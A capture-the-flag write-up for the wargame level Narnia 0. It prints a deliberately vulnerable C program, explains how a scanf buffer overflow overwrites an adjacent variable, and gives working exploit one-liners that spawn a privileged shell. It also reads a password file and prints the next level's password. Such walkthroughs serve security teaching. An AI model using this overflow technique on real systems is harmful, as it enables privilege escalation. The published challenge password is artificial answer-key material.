# Narnia 0

Password: `narnia0`

The C code is as follows (stripped license for brevity):

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

`Scanf` is not bounds checked, the two buffers `val` and `buf` are right next to each other. By crafting a string that overflows the bounds of `buf`, we can overwrite `val` - this can be simply tested by entering a string 24 characters long: the final four will replace the contents of Val (if you enter 23 characters, you will see the null byte 00, which terminates the string, overriding the first position of the val variable (as numbers on this architecture are rendered backwards)).

I ran into two problems at this point. First, copying and pasting non-printable or extended ASCII characters didn't work. deadbeef is the bytes 0xEF, 0xBE, 0xAD and 0xDE (remember its backwards), which corresponds to the extended ASCII values `▐¡╛∩`. But after trying to get those into the application, they always ended up mangled.

The solution was to use unix piping, never letting the characters be read or printed via the screen. I got a hint for this so can't take too much credit, particularly the use of `echo -e` to evaluate escape sequences: this command will feed the right data:

`echo -e "01234567890123456789\xef\xbe\xad\xde" | /narnia/narnia0`

However, the shell immediately closes; looking at the code it starts the shell system op, but then that op is immediately disposed when the program exits in the next instruciton.

The fix to get past this is to pass `cat` through in the pipe as well, keeping the shell open until cat exits:

`{ echo -e "01234567890123456789\xef\xbe\xad\xde"; cat; } | /narnia/narnia0`

Once executing the above, even though no prompt is shown, you can `cat /etc/narnia_pass/narnia1` to get the password for narnia1, `efeidiedae`

Why does cat work like this? I don't know; passing `cat /etc/narnia_pass/narnia1` directly instead of cat fails with permission denied: the process closes before the second cat command is executed. Passing cat by itself however seems to keep the process open, and of course the way cat works if no arguments are passed is that it reads from standard input and echoes, kind of creating a mini shell over the inner shell.